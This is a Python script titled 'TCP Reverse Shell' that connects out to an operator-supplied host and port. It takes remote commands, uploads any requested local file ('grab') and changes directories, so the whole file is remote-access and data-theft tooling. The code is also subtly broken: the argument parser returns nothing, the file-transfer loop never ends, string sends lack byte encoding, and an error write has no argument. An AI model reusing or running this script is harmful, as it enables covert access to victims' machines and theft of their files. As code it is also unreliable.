import socket
import subprocess
import os
import argparse
import sys


def parse_arguments():
    parser = argparse.ArgumentParser(description="TCP Reverse Shell")
    parser.add_argument("host", type=str, help="Hostname or Ip Address to Connect to")
    parser.add_argument("port", type=str, help="Port Number to Connect to")


def transfer(client, directory):
    if os.path.exists(directory):
        with open(directory.strip(), "rb") as file:
            packets = file.read(1024)
            while True:
                client.send(packets)
                packets = file.read(1024)
            client.send("Transfer Completed".encode("utf-8"))
    else:
        client.send("[!] Unable to find the file".encode("utf-8"))


def connect(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.connect((host, port))
            while True:
                command = client.recv(1024).decode("utf-8")
                if command.lower().strip() == "exit":
                    client.close()
                    break
                elif "grab" in command:
                    _, directory = command.split(" ", 1)
                    try:
                        transfer(client, directory.strip())
                    except Exception as e:
                        client.send("[!] Error: {}".format(str(e).encode()))
                elif "cd" in command:
                    _, directory = command.split(" ", 1)
                    try:
                        os.chdir(directory.strip())
                        client.send(
                            "Current Working Directory is: {}".format(
                                os.getcwd().encode("utf-8")
                            )
                        )
                    except FileNotFoundError:
                        client.send("[-] Directory not found")

        except socket.error:
            sys.stderr.write()


def main():
    args = parse_arguments()
    connect(args.host, args.port)


if __name__ == "__main__":
    main()
